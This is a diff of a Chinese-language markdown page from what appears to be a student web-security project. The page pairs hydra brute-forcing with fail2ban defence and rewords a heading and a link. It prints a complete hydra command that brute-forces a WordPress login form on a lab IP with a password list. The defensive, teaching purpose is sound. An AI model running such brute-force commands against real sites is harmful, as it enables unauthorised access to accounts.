@@ -6,9 +6,10 @@
 
 駭客端暴力破解工具為hydra     
 伺服器端防護工具為fail2ban(需安裝python)。    
-## Hydra攻擊指令介紹      
+## Hydra攻擊指令     
 ![image](c.png)      
-先查看網頁的原始碼，在擷取需要的資料，詳細說明參考[暴力破解Wordpress](https://github.com/NQUwebsecurityproject/website-security/tree/master/Hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3Wordpress)，攻擊指令如下：       
+攻擊指令如下：
+(簡易說明可前往[暴力破解Wordpress](https://github.com/NQUwebsecurityproject/website-security/tree/master/Hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3Wordpress))    
 ```
 hydra -l smallan -P pwdtxt -V 192.168.56.2 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:ERROR"
 ```
